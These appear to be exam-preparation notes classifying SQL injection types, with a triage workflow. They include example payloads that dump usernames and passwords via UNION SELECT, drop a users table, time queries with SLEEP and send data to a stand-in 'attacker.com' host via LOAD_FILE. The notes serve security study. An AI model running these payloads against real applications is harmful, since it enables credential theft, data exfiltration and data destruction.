## Advanced Injection Attacks — Types of SQL Injection Vulnerabilities

## Objective
Understand different SQLi types to:
- Identify them quickly
- Choose the right exploitation technique

Think: *“How is the query behaving—and what feedback do I get?”*

---

## 1. In-Band SQL Injection

### Concept
Data is returned directly in the response

---

### A. Error-Based SQLi

#### Behavior
- Database errors visible

---

#### Example

```sql
' 
```

→ Triggers error

---

#### Use

- Extract DB info from error messages
- Fast data leakage

---

---

### B. Union-Based SQLi

#### Behavior
- Inject `UNION` to retrieve data

---

#### Example

```sql
1 UNION SELECT username, password FROM users--
```

---

#### Requirements

- Same number of columns
- Compatible data types

---

---

## 2. Blind SQL Injection

### Concept
No direct output → infer results indirectly

---

### A. Boolean-Based Blind

#### Behavior

```sql
1 AND 1=1 → normal response
1 AND 1=2 → different response
```

---

#### Use

- Extract data bit by bit

---

---

### B. Time-Based Blind

#### Behavior

```sql
1 OR SLEEP(5)
```

→ Delay = true condition

---

#### Use

- When no visible difference in response

---

---

## 3. Out-of-Band (OOB) SQL Injection

### Concept
Database sends data to external server

---

### Example

```sql
LOAD_FILE('http://attacker.com')
```

---

### Use

- When no response channel available
- Exfiltrate data externally

---

## 4. Second-Order SQL Injection

### Concept
Payload stored → executed later

---

### Flow

1. Inject payload into DB
2. App stores it
3. Later query uses it → executes

---

### Example

```sql
username = admin'--
```

→ Stored → used later in query

---

## 5. Stacked Queries

### Concept
Execute multiple queries

---

### Example

```sql
1; DROP TABLE users--
```

---

### Requirement

- DB must support multiple statements

---

## 6. Key Differences (Quick View)

| Type            | Output Visible | Technique           |
|-----------------|--------------|--------------------|
| Error-Based     | Yes          | Trigger errors      |
| Union-Based     | Yes          | UNION SELECT        |
| Boolean Blind   | No           | True/False logic    |
| Time-Based Blind| No           | Delays              |
| OOB             | No           | External callback   |
| Second-Order    | Delayed      | Stored execution    |

---

## 7. Indicators of SQLi

- SQL errors
- Response differences
- Time delays
- Unexpected data returned

---

## 8. Fast Workflow (Exam Mode)

1. Test basic payload:
   - `' OR 1=1--`
2. Check:
   - errors → error-based
   - data → union-based
3. If blind:
   - boolean-based
   - time-based
4. If no response:
   - try OOB
5. Consider second-order

---

## 9. Mental Model

SQLi is not one technique.

It’s multiple paths depending on feedback:

- Direct → extract data fast  
- Indirect → infer slowly  
- No feedback → go external  

Your job:
→ Identify type → adapt attack